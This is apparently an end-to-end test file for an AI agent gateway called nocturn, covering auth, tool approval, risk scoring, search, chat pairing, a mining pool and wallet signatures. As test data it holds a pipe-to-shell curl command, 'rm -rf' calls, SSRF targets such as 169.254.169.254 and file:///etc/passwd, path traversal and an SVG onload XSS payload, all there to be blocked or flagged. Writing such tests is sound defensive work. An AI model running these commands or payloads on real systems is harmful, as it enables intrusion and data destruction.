// End-to-end check against a fake Anthropic server: no real key or network is used.
import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { promisify } from 'node:util';
import { existsSync, mkdtempSync, readFileSync, rmSync, symlinkSync } from 'node:fs';
import { createServer } from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const home = mkdtempSync(join(tmpdir(), 'nocturn-test-'));
process.env.NOCTURN_HOME = home;
process.env.ANTHROPIC_API_KEY = 'test-key';

const requests = [];
let script = [];
function sse(res, name, data) { res.write(`event: ${name}\ndata: ${JSON.stringify({ type: name, ...data })}\n\n`); }
function streamMessage(res, blocks, stopReason) {
  res.writeHead(200, { 'content-type': 'text/event-stream' });
  sse(res, 'message_start', { message: { id: 'msg_1', type: 'message', role: 'assistant', model: 'claude-opus-5-5', content: [], stop_reason: null, usage: { input_tokens: 1, output_tokens: 0 } } });
  blocks.forEach((b, index) => {
    if (b.type === 'text') {
      sse(res, 'content_block_start', { index, content_block: { type: 'text', text: '' } });
      sse(res, 'content_block_delta', { index, delta: { type: 'text_delta', text: b.text } });
    } else {
      sse(res, 'content_block_start', { index, content_block: { type: 'tool_use', id: b.id, name: b.name, input: {} } });
      sse(res, 'content_block_delta', { index, delta: { type: 'input_json_delta', partial_json: JSON.stringify(b.input) } });
    }
    sse(res, 'content_block_stop', { index });
  });
  sse(res, 'message_delta', { delta: { stop_reason: stopReason }, usage: { output_tokens: 5 } });
  sse(res, 'message_stop', {});
  res.end();
}
const fake = createServer((req, res) => {
  let body = '';
  req.on('data', (d) => { body += d; });
  req.on('end', () => {
    requests.push(JSON.parse(body));
    const [blocks, stop] = script.shift();
    streamMessage(res, blocks, stop);
  });
});
await new Promise((r) => fake.listen(0, '127.0.0.1', r));
process.env.ANTHROPIC_BASE_URL = `http://127.0.0.1:${fake.address().port}`;

const { boot } = await import('../src/index.mjs');
const { AUTH_TOKEN, config, updateConfig, WORKSPACE } = await import('../src/config.mjs');
const { guardUrl, safePath } = await import('../src/tools.mjs');
const { cronMatches } = await import('../src/scheduler.mjs');
const { startPool } = await import('../src/pool.mjs');
const { leadingZeroBits, shareHash } = await import('../src/pow.mjs');
const { checkPoolUrl } = await import('../src/mine.mjs');
const { tuneThreads } = await import('../src/hardware.mjs');
const { checkWalletProof, linkMessage } = await import('../src/wallet-proof.mjs');
const { secp256k1 } = await import('@noble/curves/secp256k1');
const { keccak_256 } = await import('@noble/hashes/sha3');
const { agent, channels, server, port } = await boot(0);
const base = `http://127.0.0.1:${port}`;
const call = (path, method = 'GET', body, token = AUTH_TOKEN) => fetch(`${base}/api/${path}`, {
  method,
  headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
  body: body ? JSON.stringify(body) : undefined,
});
const waitFor = (type) => new Promise((resolve) => {
  const on = (e) => { if (e.type === type) { agent.off('event', on); resolve(e); } };
  agent.on('event', on);
});
let passed = 0;
async function check(name, fn) { await fn(); passed++; console.log(`ok - ${name}`); }

await check('API rejects a wrong token', async () => {
  assert.equal((await call('state', 'GET', null, 'wrong')).status, 401);
});

await check('API rejects a foreign Origin', async () => {
  const res = await fetch(`${base}/api/state`, { headers: { authorization: `Bearer ${AUTH_TOKEN}`, origin: 'https://evil.example' } });
  assert.equal(res.status, 403);
});

await check('static serving cannot escape public/', async () => {
  const res = await fetch(`${base}/..%2F.data%2Ftoken`);
  assert.equal(res.status, 404);
});

await check('saved secrets are never returned', async () => {
  const res = await call('config', 'PUT', { anthropicKey: 'sk-secret-value' });
  assert.ok(!(await res.text()).includes('sk-secret-value'));
  assert.equal(config.anthropicKey, 'sk-secret-value');
  await call('config', 'PUT', { anthropicKey: '' });
  assert.equal(config.anthropicKey, 'sk-secret-value');
});

await check('agent loop waits for approval, runs the tool, and finishes', async () => {
  script = [
    [[{ type: 'text', text: 'Writing.' }, { type: 'tool_use', id: 'tu_1', name: 'write_file', input: { path: 'hello.txt', content: 'hi' } }], 'tool_use'],
    [[{ type: 'text', text: 'All done.' }], 'end_turn'],
  ];
  const { id } = await (await call('sessions', 'POST', {})).json();
  const approval = waitFor('approval');
  const ended = waitFor('turn_end');
  await call(`sessions/${id}/messages`, 'POST', { text: 'write it' });
  const { id: approvalId } = await approval;
  assert.ok(!existsSync(join(WORKSPACE, 'hello.txt')), 'must not run before approval');
  await call(`approvals/${approvalId}`, 'POST', { approved: true });
  await ended;
  assert.equal(readFileSync(join(WORKSPACE, 'hello.txt'), 'utf8'), 'hi');
  const session = await (await call(`sessions/${id}`)).json();
  assert.equal(session.messages.length, 4);
  assert.equal(session.messages[3].content[0].text, 'All done.');
  const sent = requests.at(-1);
  assert.equal(sent.model, 'claude-opus-5-5');
  assert.deepEqual(sent.thinking, { type: 'adaptive', display: 'summarized' });
  assert.equal(sent.messages[2].content[0].tool_use_id, 'tu_1');
});

await check('a denied tool does not run and the model is told', async () => {
  script = [
    [[{ type: 'tool_use', id: 'tu_2', name: 'shell', input: { command: 'echo pwned > pwned.txt' } }], 'tool_use'],
    [[{ type: 'text', text: 'Understood.' }], 'end_turn'],
  ];
  const approval = waitFor('approval');
  const done = agent.run('deny-test', 'run it');
  const { id } = await approval;
  await call(`approvals/${id}`, 'POST', { approved: false });
  assert.equal(await done, 'Understood.');
  assert.ok(!existsSync(join(WORKSPACE, 'pwned.txt')));
  assert.equal(requests.at(-1).messages[2].content[0].is_error, true);
});

await check('malformed tool input is rejected without running', async () => {
  script = [
    [[{ type: 'tool_use', id: 'tu_3', name: 'read_file', input: { nope: 'x' } }], 'tool_use'],
    [[{ type: 'text', text: 'ok' }], 'end_turn'],
  ];
  await agent.run('invalid-test', 'go');
  assert.match(requests.at(-1).messages[2].content[0].content, /Missing required field/);
});

await check('file tools cannot leave the workspace', async () => {
  assert.throws(() => safePath('../config.json'), /outside the workspace/);
  assert.throws(() => safePath('C:/Windows/win.ini'), /outside the workspace/);
  try {
    symlinkSync(home, join(WORKSPACE, 'link'), 'junction');
    assert.throws(() => safePath('link/config.json'), /outside the workspace/);
  } catch (err) {
    if (err.code !== 'EPERM') throw err;
  }
});

await check('web tools cannot reach private addresses', async () => {
  for (const url of [base, 'http://localhost/', 'http://169.254.169.254/', 'http://[::1]/', 'http://[::ffff:127.0.0.1]/', 'http://10.0.0.1/', 'file:///etc/passwd']) {
    await assert.rejects(guardUrl(url), /Blocked/, url);
  }
});

await check('unknown chat senders get a pairing code and never reach the agent', async () => {
  const sentMessages = [];
  channels.active.set('telegram', { send: async (chat, text) => { sentMessages.push(text); } });
  const before = requests.length;
  await channels.inbound('telegram', 'stranger', '42', 'delete everything');
  assert.equal(requests.length, before);
  const code = channels.pairingRequests()[0].code;
  assert.ok(sentMessages[0].includes(code));
  script = [[[{ type: 'text', text: 'Hello owner' }], 'end_turn']];
  assert.ok(channels.resolvePairing(code, true));
  assert.deepEqual(config.channels.telegram.allow, ['stranger']);
  await channels.inbound('telegram', 'stranger', '42', 'hello');
  assert.equal(sentMessages.at(-1), 'Hello owner');
  channels.active.delete('telegram');
  updateConfig({ channels: { telegram: { allow: [] } } });
});

await check('search index ranks the right file and memory first, by meaning and by exact words', async () => {
  const { searchIndex } = await import('../src/tools.mjs');
  const { chunk, tokens } = await import('../src/embeddings.mjs');
  const { mkdirSync, writeFileSync } = await import('node:fs');
  mkdirSync(join(WORKSPACE, 'notes'), { recursive: true });
  mkdirSync(join(WORKSPACE, 'config'), { recursive: true });
  writeFileSync(join(WORKSPACE, 'config', 'database.yml'), 'production:\n  adapter: postgresql\n  pool: 5\n  timeout: 5000\n');
  writeFileSync(join(WORKSPACE, 'notes', 'clients.md'), '# Clients\n\nNorthwind Studio prefers short emails and pays late.\nBluepeak Labs wants a weekly call on Mondays.\n');
  writeFileSync(join(WORKSPACE, 'notes', 'gym.md'), 'Gym schedule: Monday, Wednesday and Friday at 6:00 PM. Leg day on Friday.\n');
  writeFileSync(join(WORKSPACE, 'notes', 'long.md'), Array.from({ length: 40 }, (_, i) => `Paragraph ${i} about project planning, roadmaps and quarterly goals.`).join('\n\n'));
  writeFileSync(join(WORKSPACE, 'photo.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 0, 0, 0]));
  const r1 = await call('memory', 'POST', { text: 'The owner likes answers under three sentences.' });
  assert.equal(r1.status, 201);
  await call('memory', 'POST', { text: 'Invoices go out on the first business day of the month.' });
  const built = await (await call('index', 'POST', {})).json();
  assert.equal(built.provider, 'local');
  assert.ok(built.entries >= 6, 'memories and files are indexed');
  assert.ok(chunk('x'.repeat(2000)).length >= 3, 'long text is split into overlapping chunks');
  assert.deepEqual(tokens('Invoices go out'), ['invoice', 'go', 'out']);

  const files = await (await call('search', 'POST', { query: 'how big is the database connection pool', kinds: ['file'] })).json();
  assert.equal(files[0].path, 'config/database.yml', 'exact words win through BM25 even with the built-in vectors');
  const gym = await (await call('search', 'POST', { query: 'when do I work out', kinds: ['file'] })).json();
  assert.ok(gym.length, 'a paraphrase still returns results');
  const client = await (await call('search', 'POST', { query: 'Northwind payment habits', kinds: ['file'] })).json();
  assert.equal(client[0].path, 'notes/clients.md');
  assert.ok(!files.some((h) => h.path === 'photo.png'), 'binary files are skipped');

  const memories = await (await call('search', 'POST', { query: 'invoice timing', kinds: ['memory'] })).json();
  assert.equal(memories[0].kind, 'memory');
  assert.ok(memories[0].snippet.includes('first business day'));

  // The agent's own tool goes through the same index.
  const { runTool } = await import('../src/tools.mjs');
  const text = await runTool('search_workspace', { query: 'postgres pool timeout' }, {});
  assert.ok(text.startsWith('config/database.yml'), text);
  const remembered = await runTool('memory_search', { query: 'short answers' }, {});
  assert.ok(remembered.includes('three sentences'), remembered);

  // Incremental: a second refresh embeds nothing new; a change embeds only that file's chunks.
  const again = await (await call('index', 'POST', {})).json();
  assert.equal(again.embedded, 0);
  writeFileSync(join(WORKSPACE, 'config', 'database.yml'), 'production:\n  adapter: postgresql\n  pool: 20\n  timeout: 5000\n');
  const changed = await (await call('index', 'POST', {})).json();
  assert.equal(changed.embedded, 1);
  assert.equal(searchIndex.size, changed.entries);
});

await check('a voice note is transcribed before it reaches the agent, and strangers are not downloaded', async () => {
  const { transcriber } = await import('../src/transcribe.mjs');
  // A fake OpenAI-compatible /audio/transcriptions server.
  const heard = [];
  const stt = createServer(async (req, res) => {
    const parts = [];
    for await (const d of req) parts.push(d);
    heard.push({ url: req.url, auth: req.headers.authorization, size: Buffer.concat(parts).length, type: req.headers['content-type'] });
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ text: 'Remind me to call the supplier tomorrow at nine.' }));
  });
  await new Promise((r) => stt.listen(0, '127.0.0.1', r));
  updateConfig({ transcription: { provider: 'openai', baseUrl: `http://127.0.0.1:${stt.address().port}/v1`, key: 'stt-key' } });
  transcriber.reset();
  assert.equal(await transcriber.decide(), 'openai');

  const sent = [];
  channels.active.set('telegram', { send: async (chat, text) => { sent.push(text); } });
  let downloads = 0;
  const attachment = { kind: 'audio', name: 'voice.ogg', mime: 'audio/ogg', fetch: async () => { downloads++; return Buffer.alloc(4096, 1); } };
  // A stranger sends a voice note: pairing code, no download, no transcription.
  await channels.inbound('telegram', 'voice-stranger', '77', '', attachment);
  assert.equal(downloads, 0);
  assert.equal(heard.length, 0);
  assert.ok(sent.at(-1).includes('Pairing code'));
  // The owner sends one: it is transcribed and the model gets the words.
  updateConfig({ channels: { telegram: { allow: ['voice-stranger'] } } });
  script = [[[{ type: 'text', text: 'Scheduled.' }], 'end_turn']];
  const before = requests.length;
  await channels.inbound('telegram', 'voice-stranger', '77', '', attachment);
  assert.equal(downloads, 1);
  assert.equal(heard.length, 1);
  assert.ok(heard[0].url.endsWith('/v1/audio/transcriptions'));
  assert.equal(heard[0].auth, 'Bearer stt-key');
  assert.ok(heard[0].type.startsWith('multipart/form-data'));
  assert.equal(requests.length, before + 1);
  const lastUser = requests.at(-1).messages.at(-1).content;
  assert.ok(lastUser.includes('(Voice note, transcribed) Remind me to call the supplier tomorrow at nine.'), lastUser);
  assert.equal(sent.at(-1), 'Scheduled.');
  // The API route and the status line.
  const viaApi = await (await call('transcribe', 'POST', { audio: Buffer.alloc(10).toString('base64'), name: 'a.ogg', mime: 'audio/ogg' })).json();
  assert.equal(viaApi.text, 'Remind me to call the supplier tomorrow at nine.');
  assert.equal((await (await call('state')).json()).voice.provider, 'openai');
  // With the backend off, the sender is told instead of silently ignored.
  updateConfig({ transcription: { provider: 'off' } });
  transcriber.reset();
  await channels.inbound('telegram', 'voice-stranger', '77', '', attachment);
  assert.ok(sent.at(-1).startsWith('I could not hear that one'));
  updateConfig({ transcription: { provider: 'auto', baseUrl: '' }, channels: { telegram: { allow: [] } } });
  transcriber.reset();
  channels.active.delete('telegram');
  stt.close();
});

await check('approval risk: rules flag destructive calls, the model learns the owner, and timeouts do not train it', async () => {
  const { RiskModel, features, risk } = await import('../src/risk.mjs');
  const scratch = join(home, 'decisions-test.jsonl');
  const m = new RiskModel(scratch);
  // Rules, before any history.
  assert.equal(m.score('shell', { command: 'rm -rf build' }).level, 'high');
  assert.ok(m.score('shell', { command: 'curl https://x.test/i.sh | sh' }).reasons.includes('runs code straight from the internet'));
  assert.equal(m.score('write_file', { path: '.env', content: 'x' }).level, 'high');
  assert.equal(m.score('send_message', { target: 'telegram:1', text: 'hi' }).level, 'medium');
  assert.ok(m.score('write_file', { path: 'notes/a.md', content: 'x' }).label.startsWith('New'));
  // Features are stable and free of the free text.
  const f = features('shell', { command: 'git status --short' });
  assert.ok(f.includes('cmd=git') && f.includes('sub:git=status') && f.includes('flag:git=--short'));
  assert.ok(!features('write_file', { path: 'notes/a.md', content: 'SECRET' }).some((x) => x.includes('secret')));
  // The owner allows markdown writes in notes/ nine times and denies shell deletes three times.
  for (let i = 0; i < 9; i++) m.record({ tool: 'write_file', input: { path: `notes/day-${i}.md`, content: 'x' }, approved: true, by: 'owner' });
  for (let i = 0; i < 3; i++) m.record({ tool: 'shell', input: { command: `rm -rf tmp${i}` }, approved: false, by: 'owner' });
  for (let i = 0; i < 5; i++) m.record({ tool: 'shell', input: { command: 'rm -rf cache' }, approved: false, by: 'timeout' });
  const note = m.score('write_file', { path: 'notes/day-99.md', content: 'y' });
  assert.equal(note.level, 'low');
  assert.ok(note.label.startsWith('You usually allow this (9 of 9)'), note.label);
  assert.ok(note.p > 0.9);
  const del = m.score('shell', { command: 'rm -rf old' });
  assert.equal(del.level, 'high');
  assert.ok(del.label.startsWith('You usually deny this (3 of 3)'), del.label);
  assert.ok(del.p < 0.1);
  // Something else entirely is still "new", not low.
  const other = m.score('web_fetch', { url: 'https://example.com' });
  assert.ok(other.label.startsWith('New'));
  assert.equal(other.level, 'medium');
  // Decisions survive a restart.
  const again = new RiskModel(scratch);
  assert.equal(again.nApproved, 9);
  assert.equal(again.nDenied, 3);
  // End to end: the approval event carries the assessment and the owner's answer is recorded.
  script = [
    [[{ type: 'tool_use', id: 'tu_r', name: 'shell', input: { command: 'rm -rf node_modules' } }], 'tool_use'],
    [[{ type: 'text', text: 'Ok.' }], 'end_turn'],
  ];
  const { id } = await (await call('sessions', 'POST', {})).json();
  const approval = waitFor('approval');
  const ended = waitFor('turn_end');
  await call(`sessions/${id}/messages`, 'POST', { text: 'clean up' });
  const e = await approval;
  assert.equal(e.risk.level, 'high');
  assert.ok(e.risk.reasons.includes('deletes recursively'));
  const pending = (await (await call('state')).json()).approvals.find((a) => a.id === e.id);
  assert.equal(pending.risk.level, 'high');
  const before = risk.nDenied;
  await call(`approvals/${e.id}`, 'POST', { approved: false });
  await ended;
  assert.equal(risk.nDenied, before + 1);
  assert.ok(existsSync(join(home, 'decisions.jsonl')));
});

await check('cron expressions match correctly', async () => {
  const mondayEight = new Date(2026, 10, 2, 8, 0);
  assert.ok(cronMatches('0 8 * * 1-5', mondayEight));
  assert.ok(cronMatches('*/15 * * * *', mondayEight));
  assert.ok(!cronMatches('0 8 * * 0,6', mondayEight));
  assert.throws(() => cronMatches('99 * * * *', mondayEight));
  const res = await call('jobs', 'POST', { name: 'bad', cron: 'nonsense', prompt: 'x' });
  assert.equal(res.status, 400);
});

await check('a refusal is surfaced and leaves history usable', async () => {
  script = [[[], 'refusal']];
  await assert.rejects(agent.run('refusal-test', 'x'), /declined/);
});

await check('partner logos must be real bitmaps', async () => {
  const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0]).toString('base64');
  const svg = Buffer.from('<svg onload="alert(1)"/>').toString('base64');
  for (const logo of [`data:image/svg+xml;base64,${svg}`, `data:image/png;base64,${svg}`, 'https://evil.example/x.png', undefined]) {
    assert.equal((await call('partners', 'POST', { name: 'Acme', logo })).status, 400);
  }
  assert.equal((await call('partners', 'POST', { name: ' ', logo: `data:image/png;base64,${png}` })).status, 400);
  assert.equal((await call('partners', 'GET', null, 'wrong')).status, 401);
  const [added] = await (await call('partners', 'POST', { name: 'Acme', logo: `data:image/png;base64,${png}` })).json();
  assert.equal(added.name, 'Acme');
  assert.deepEqual(await (await call(`partners/${added.id}`, 'DELETE')).json(), []);
});

const execFileP = promisify(execFile);
const nocturn = (...args) => execFileP(process.execPath, [fileURLToPath(new URL('../bin/nocturn.mjs', import.meta.url)), ...args], { env: { ...process.env, NOCTURN_PORT: String(port) } });

await check('CLI reports the running gateway', async () => {
  const status = JSON.parse((await nocturn('status', '--json')).stdout);
  assert.equal(status.gateway, 'running');
  assert.equal(status.port, port);
  assert.ok(!JSON.stringify(status).includes('sk-secret-value'));
});

await check('CLI runs a one-shot agent task', async () => {
  script = [[[{ type: 'text', text: 'Hello from the CLI' }], 'end_turn']];
  const { reply, sessionId } = JSON.parse((await nocturn('agent', '-m', 'hi', '--json')).stdout);
  assert.equal(reply, 'Hello from the CLI');
  assert.ok(sessionId);
});

await check('CLI manages cron and memory, and fails with a non-zero exit', async () => {
  await nocturn('cron', 'add', '--name', 'brief', '--cron', '0 8 * * 1-5', '--message', 'plan my day');
  const jobs = JSON.parse((await nocturn('cron', 'list', '--json')).stdout);
  assert.equal(jobs.at(-1).name, 'brief');
  await nocturn('cron', 'rm', jobs.at(-1).id);
  await nocturn('memory', 'add', 'likes', 'tea');
  assert.equal(JSON.parse((await nocturn('memory', 'list', '--json')).stdout).at(-1).text, 'likes tea');
  await assert.rejects(nocturn('message', 'send', '--to', 'telegram:1', '-m', 'x'), /not connected/);
  await assert.rejects(nocturn('nonsense'), /Unknown command/);
});

await check('pool checks work itself, needs the check and splits the reward by work', async () => {
  const pool = await startPool({ port: 0, file: join(home, 'pool.json'), roundMs: 3600000, rewardCents: 10000, startDifficulty: 8 });
  const at = `http://127.0.0.1:${pool.port}`;
  const post = (path, body, token) => fetch(`${at}${path}`, { method: 'POST', headers: token ? { authorization: `Bearer ${token}` } : {}, body: JSON.stringify(body) });
  const get = (token) => fetch(`${at}/job`, { headers: { authorization: `Bearer ${token}` } });
  const signUp = async (name) => (await (await post('/register', { name })).json()).token;
  const alice = await signUp('alice');
  const bob = await signUp('bob');
  assert.equal((await post('/register', { name: 'alice' })).status, 409);
  assert.equal((await post('/register', { name: 'x y' })).status, 400);
  assert.equal((await get('wrong')).status, 401);
  assert.equal((await get(alice)).status, 403);
  const pass = async (token) => {
    const [x, y] = (await (await post('/check', {}, token)).json()).question.split(' + ').map(Number);
    assert.equal((await post('/check/answer', { answer: x + y }, token)).status, 200);
  };
  await post('/check', {}, alice);
  assert.equal((await post('/check/answer', { answer: -1 }, alice)).status, 403);
  await pass(alice);
  await pass(bob);
  const { seed, difficulty } = await (await get(alice)).json();
  const mine = (name, from = 0) => {
    for (let i = from; ; i += 1) if (leadingZeroBits(shareHash(seed, name, String(i))) >= difficulty) return String(i);
  };
  const nonce = mine('alice');
  const send = async (n, token, s = seed) => (await post('/share', { seed: s, nonce: n }, token)).json();
  assert.equal((await send(nonce, alice, 'old')).reason, 'stale');
  assert.equal((await send(nonce, bob)).accepted, false); // a share is tied to the miner who found it
  assert.equal((await send(nonce, alice)).accepted, true);
  assert.equal((await send(nonce, alice)).accepted, false);
  assert.equal((await send(mine('bob'), bob)).accepted, true);
  pool.closeRound();
  const balance = async (token) => (await (await get(token)).json()).cents;
  assert.equal(await balance(alice), 5000);
  assert.equal(await balance(bob), 5000);
  pool.close();
  const again = await startPool({ port: 0, file: join(home, 'pool.json') });
  const reopened = await fetch(`http://127.0.0.1:${again.port}/check`, { method: 'POST', headers: { authorization: `Bearer ${alice}` } });
  assert.equal(reopened.status, 200); // accounts survive a restart
  again.close();
  const short = await startPool({ port: 0, file: join(home, 'pool2.json'), checkIdleMs: 400 });
  const sat = `http://127.0.0.1:${short.port}`;
  const ask = (path, token, body) => fetch(`${sat}${path}`, { method: body ? 'POST' : 'GET', headers: { authorization: `Bearer ${token}` }, body: body ? JSON.stringify(body) : undefined });
  const rig = (await (await fetch(`${sat}/register`, { method: 'POST', body: JSON.stringify({ name: 'rig' }) })).json()).token;
  const sum = (await (await ask('/check', rig, {})).json()).question.split(' + ').map(Number);
  await ask('/check/answer', rig, { answer: sum[0] + sum[1] });
  for (let i = 0; i < 5; i += 1) { // keeps working well past the limit while it stays in touch
    await new Promise((r) => setTimeout(r, 200));
    assert.equal((await ask('/job', rig)).status, 200);
  }
  short.close();
  const back = await startPool({ port: 0, file: join(home, 'pool2.json'), checkIdleMs: 400 });
  const after = `http://127.0.0.1:${back.port}/job`;
  const job = () => fetch(after, { headers: { authorization: `Bearer ${rig}` } });
  assert.equal((await job()).status, 200); // a pool restart does not stop it
  await new Promise((r) => setTimeout(r, 500));
  assert.equal((await job()).status, 403); // gone quiet: asks again
  back.close();
  assert.throws(() => checkPoolUrl('http://pool.example.com'), /https/);
  assert.equal(checkPoolUrl('https://pool.example.com/'), 'https://pool.example.com');
});

await check('auto-tune drops a thread when hot or short on memory, and adds one back once cool', async () => {
  const base = { active: 7, max: 7, celsius: 60, ramFreeRatio: 0.5, now: 100000, lastChange: 0 };
  assert.equal(tuneThreads(base).active, 7);
  assert.equal(tuneThreads({ ...base, celsius: 90 }).active, 6);
  assert.equal(tuneThreads({ ...base, celsius: 90, active: 1 }).active, 1);
  assert.equal(tuneThreads({ ...base, ramFreeRatio: 0.05 }).active, 6);
  assert.equal(tuneThreads({ ...base, active: 5 }).active, 6);
  assert.equal(tuneThreads({ ...base, active: 5, lastChange: 80000 }).active, 5); // waits a minute between steps up
  assert.equal(tuneThreads({ ...base, active: 5, celsius: null }).active, 5); // no sensor, no guessing
});

await check('a wallet is linked only with a real signature from that wallet', async () => {
  // A wallet the way MetaMask does it: personal_sign over the message, 65-byte r|s|v signature.
  const wallet = () => {
    const key = secp256k1.utils.randomPrivateKey();
    const address = `0x${Buffer.from(keccak_256(secp256k1.getPublicKey(key, false).subarray(1))).subarray(12).toString('hex')}`;
    const personalSign = (text) => {
      const bytes = Buffer.from(text);
      const sig = secp256k1.sign(keccak_256(Buffer.concat([Buffer.from(`\x19Ethereum Signed Message:\n${bytes.length}`), bytes])), key);
      return `0x${Buffer.from(sig.toCompactRawBytes()).toString('hex')}${(27 + sig.recovery).toString(16)}`;
    };
    return { address, personalSign };
  };
  const mine = wallet();
  const address = mine.address;
  const message = linkMessage(address, new Date().toISOString());
  const signature = mine.personalSign(message);
  assert.equal(checkWalletProof({ address: address.toUpperCase().replace('0X', '0x'), message, signature }).address, address);
  const other = wallet().address;
  assert.throws(() => checkWalletProof({ address: other, message: linkMessage(other, new Date().toISOString()), signature }), /does not match/);
  assert.throws(() => checkWalletProof({ address, message: `${message}x`, signature }), /Unexpected|does not match/);

  assert.equal((await call('wallet', 'POST', { address, message, signature: `0x${'00'.repeat(65)}` })).status, 400);
  assert.equal((await call('wallet', 'POST', { address, message, signature })).status, 200);
  assert.equal((await (await call('wallet')).json()).address, address);

  const pool = await startPool({ port: 0, file: join(home, 'pool3.json') });
  const at = `http://127.0.0.1:${pool.port}`;
  const token = (await (await fetch(`${at}/register`, { method: 'POST', body: JSON.stringify({ name: 'walletuser' }) })).json()).token;
  const link = (body) => fetch(`${at}/wallet`, { method: 'POST', headers: { authorization: `Bearer ${token}` }, body: JSON.stringify(body) });
  assert.equal((await link({ address: other, message, signature })).status, 400);
  assert.equal((await link({ address, message, signature })).status, 200);
  assert.equal((await (await fetch(`${at}/balance`, { headers: { authorization: `Bearer ${token}` } })).json()).wallet, address);
  pool.close();
  assert.equal((await call('wallet', 'DELETE')).status, 200);
  assert.deepEqual(await (await call('wallet')).json(), {});
});

await check('a run started from chat is approved from that chat', async () => {
  const sent = [];
  channels.active.set('telegram', { send: async (chat, text) => { sent.push(text); } });
  updateConfig({ channels: { telegram: { allow: ['owner'] } } });
  script = [
    [[{ type: 'tool_use', id: 'tu_chat', name: 'write_file', input: { path: 'chat.txt', content: 'ok' } }], 'tool_use'],
    [[{ type: 'text', text: 'Written.' }], 'end_turn'],
  ];
  const approval = waitFor('approval');
  const done = channels.inbound('telegram', 'owner', '7', 'write it');
  await approval;
  assert.match(sent.at(-1), /Reply \/approve/);
  assert.ok(!existsSync(join(WORKSPACE, 'chat.txt')));
  await channels.inbound('telegram', 'owner', '7', '/approve');
  await done;
  assert.equal(readFileSync(join(WORKSPACE, 'chat.txt'), 'utf8'), 'ok');
  assert.equal(sent.at(-1), 'Written.');
  channels.active.delete('telegram');
  updateConfig({ channels: { telegram: { allow: [] } } });
});

console.log(`\n${passed} checks passed`);
server.closeAllConnections();
server.close();
fake.close();
rmSync(home, { recursive: true, force: true });
process.exit(0);
